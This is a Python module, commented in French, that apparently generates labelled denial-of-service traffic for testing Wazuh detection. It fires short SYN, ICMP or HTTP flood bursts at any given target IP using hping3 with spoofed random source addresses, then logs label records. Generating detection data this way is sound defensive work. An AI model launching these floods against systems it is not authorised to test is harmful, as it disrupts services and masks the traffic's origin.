# Module de flooding DOS.
#
# Envoie de courtes rafales de trafic qui ressemblent a une tentative de
# deni de service mais sont deliberateument limitees en duree et en debit
# pour que la cible reste reactive. Trois variantes disponibles : flood SYN,
# flood ICMP echo, et flood de requetes HTTP.
#
# La rafale ne depasse jamais burst.dos_secondes depuis la config
# (defaut 20 secondes). C'est suffisant pour declencher les regles de
# detection/reconnaissance Wazuh sans perturber la cible.

import subprocess
import sys
from datetime import datetime, timezone
import random

sys.path.insert(0, "..")

from utils.logger import record_label, log_run


VARIANTS = {
    "syn_flood": {
        "tool": "hping3",
        "cmd": lambda ip, rate, dur: [
            "hping3", "-S", "--flood",
            "--rand-source",
            "-c", str(rate * dur),
            ip,
        ],
    },
    "icmp_flood": {
        "tool": "hping3",
        "cmd": lambda ip, rate, dur: [
            "hping3", "--icmp", "--flood",
            "--rand-source",
            "-c", str(max(rate * dur, 10)),
            ip,
        ],
    },
    "http_flood": {
        "tool": "curl",
        "cmd": lambda ip, rate, dur: [
            "curl", "-s", "-o", "/dev/null",
            "--rate", f"{rate}/s",
            f"http://{ip}/",
        ],
    },
}


def run(target_ip, config, label_file="labels.csv"):
    """Execute une variante de rafale DOS contre la cible.

    Cles de configuration utilisees :
        - burst.dos_seconds (int, default 20)
        - intensity.dos_flood (int, packets/requests per second)
    """
    burst_dur = config.get("burst", {}).get("dos_seconds", 20)
    rate = config.get("intensity", {}).get("dos_flood", 20)

    variant_name = random.choice(list(VARIANTS.keys()))
    variant = VARIANTS[variant_name]

    start_ts = datetime.now(timezone.utc)
    logfile = log_run("dos_flood")

    try:
        cmd = variant["cmd"](target_ip, rate, burst_dur)
        subprocess.run(cmd, stdout=logfile, stderr=logfile,
                       timeout=burst_dur + 10, check=False)
    except FileNotFoundError:
        if variant_name != "http_flood":
            print("  [WARN] hping3 not installed. Install with: sudo apt install hping3")
        else:
            print("  [WARN] curl not installed (unlikely, but check)")
        return False
    except subprocess.TimeoutExpired:
        print(f"  [WARN] {variant_name} timed out")
    except Exception as e:
        print(f"  [ERROR] {variant_name}: {e}")
        return False
    finally:
        logfile.close()

    end_ts = datetime.now(timezone.utc)

    record_label(
        label_class="dos_flood",
        module_name="dos_flood",
        tool_used=variant["tool"],
        target_ip=target_ip,
        start_ts=start_ts,
        end_ts=end_ts,
        label_file=label_file,
        extra_params={"variant": variant_name, "rate_per_sec": rate},
    )

    print(f"  dos_flood ({variant_name}, {rate}/s, {burst_dur}s) -> {target_ip}  OK")
    return True


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=True)
    parser.add_argument("--out", default="labels.csv")
    args = parser.parse_args()
    run(args.target, {}, label_file=args.out)
